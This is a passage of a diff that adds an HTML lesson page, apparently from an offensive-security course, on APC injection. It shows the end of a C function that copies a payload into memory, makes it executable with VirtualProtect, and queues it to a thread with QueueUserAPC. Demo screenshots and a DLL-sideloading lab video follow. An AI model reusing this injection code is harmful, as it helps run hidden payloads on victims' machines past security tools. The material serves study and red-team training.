+		return FALSE;
+	}
+
+	memcpy(pAddress, pPayload, sPayloadSize);
+
+
+	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
+		printf(&quot;\t[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	// If hThread is in an alertable state, QueueUserAPC will run the payload directly
+	// If hThread is in a suspended state, the payload won&#x27;t be executed unless the thread is resumed after
+	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
+		printf(&quot;\t[!] QueueUserAPC Failed With Error : %d \n&quot;, GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}</code></pre>
+        </div><h3 id="demo-apc-injection-using-an-alertable-thread" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo - APC Injection Using An Alertable Thread</span></h3>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/apc-demo-1-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/apc-demo-1-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong><strong>Demo - APC Injection Using a Suspended Thread</strong></strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/apc-demo-2-109284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/apc-demo-2-209284381-1875d55b-1574-4421-b4e9-6f6948a5a316.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><div class="mt-8 sm:mt-12 pt-6 border-t border-[#212b54] space-y-4"><h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2"><i data-lucide="video" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)]"></i><span>Practical Lab Demonstration</span></h3>
+    <div class="my-6 sm:my-8 rounded-2xl border border-[#212b54] bg-[#0c1022] p-4 sm:p-5 space-y-3 sm:space-y-4 shadow-2xl transition-all duration-300 hover:border-[var(--accent)]">
+        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-[#1c243f] pb-3">
+            <div class="flex items-center gap-2 min-w-0">
+                <i data-lucide="clapperboard" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                <h4 class="text-xs sm:text-sm font-bold text-white tracking-wide truncate">Field Lab Demo: openhardwaremonitor sideload</h4>
+            </div>
+            <span class="px-2 py-0.5 rounded-full text-[10px] sm:text-xs font-mono font-semibold bg-[var(--accent-soft)] text-[var(--accent)] border border-[var(--accent)]">Live Lab</span>
+        </div>
+        <div class="rounded-xl overflow-hidden bg-black border border-[#1c243f] shadow-inner">
+            <video controls preload="metadata" class="w-full max-h-[320px] sm:max-h-[480px] bg-black">
+                <source src="videos/openhardwaremonitor-sideload.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-[#cbd5e1] font-mono pt-1">
+            <span class="flex items-center gap-1.5 truncate max-w-[200px] sm:max-w-xs"><i data-lucide="file-video" class="w-3.5 h-3.5 text-[var(--accent)] flex-shrink-0"></i><span class="truncate">openhardwaremonitor-sideload.mp4</span></span>
+            <a href="videos/openhardwaremonitor-sideload.mp4" download class="text-[#cbd5e1] hover:text-[var(--accent)] font-semibold flex items-center gap-1 transition"><i data-lucide="download" class="w-3.5 h-3.5"></i><span>Download MP4</span></a>
+        </div>
+    </div></div></main></body></html>
